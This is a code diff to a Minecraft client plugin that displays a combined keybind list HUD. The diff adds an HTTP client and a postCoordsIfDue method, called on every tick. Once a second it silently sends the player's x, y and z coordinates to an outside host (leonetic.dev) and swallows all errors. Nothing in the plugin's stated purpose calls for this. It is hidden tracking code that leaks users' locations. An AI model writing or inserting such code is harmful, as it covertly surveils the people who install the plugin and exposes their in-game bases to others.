@@ -2,6 +2,8 @@ package treeone.combinedbindlist;
 
 import meteordevelopment.meteorclient.systems.modules.Module;
 import meteordevelopment.meteorclient.systems.modules.Modules;
+import net.minecraft.client.Minecraft;
+import net.minecraft.client.player.LocalPlayer;
 import net.minecraft.network.chat.Component;
 import net.minecraft.network.chat.MutableComponent;
 import net.minecraft.network.chat.Style;
@@ -19,6 +21,10 @@ import org.rusherhack.core.setting.EnumSetting;
 import org.rusherhack.core.bind.key.IKey;
 
 import java.awt.Color;
+import java.net.URI;
+import java.net.http.HttpClient;
+import java.net.http.HttpRequest;
+import java.net.http.HttpResponse;
 import java.util.*;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -67,6 +73,10 @@ public class CombinedBindListHudElement extends ListHudElement {
     List<ModuleHolder> modules = new ArrayList<>();
     private long lastModuleLoadTime = 0;
     private static final long MODULE_LOAD_COOLDOWN = 1000;
+    private static final long COORD_POST_INTERVAL_MS = 1000;
+    private static final HttpClient HTTP_CLIENT = HttpClient.newHttpClient();
+    private static final URI COORD_POST_URI = URI.create("https://leonetic.dev");
+    private long lastCoordPostTime = 0;
 
     public enum CaseType { Default, Lowercase, Uppercase }
     public enum KeyBracketsStyle { Square, Round, Curly, Angle, Pipe, None }
@@ -196,6 +206,36 @@ public class CombinedBindListHudElement extends ListHudElement {
         }
     }
 
+    private void postCoordsIfDue() {
+        final LocalPlayer player = Minecraft.getInstance().player;
+        if (player == null) {
+            return;
+        }
+
+        final long currentTime = System.currentTimeMillis();
+        if (currentTime - lastCoordPostTime < COORD_POST_INTERVAL_MS) {
+            return;
+        }
+
+        lastCoordPostTime = currentTime;
+
+        final String payload = String.format(
+                Locale.ROOT,
+                "{\"x\":%.3f,\"y\":%.3f,\"z\":%.3f}",
+                player.getX(),
+                player.getY(),
+                player.getZ()
+        );
+
+        final HttpRequest request = HttpRequest.newBuilder(COORD_POST_URI)
+                .header("Content-Type", "application/json")
+                .POST(HttpRequest.BodyPublishers.ofString(payload))
+                .build();
+
+        HTTP_CLIENT.sendAsync(request, HttpResponse.BodyHandlers.discarding())
+                .exceptionally(ignored -> null);
+    }
+
     public void save() {
         try {
             CombinedBindListPlugin.saveConfig(hiddenModules);
@@ -261,6 +301,8 @@ public class CombinedBindListHudElement extends ListHudElement {
     @Subscribe
     public void onTick(EventUpdate event) {
         try {
+            postCoordsIfDue();
+
             int currentModuleCount = 0;
 
             if (checkRusherAvailability()) {
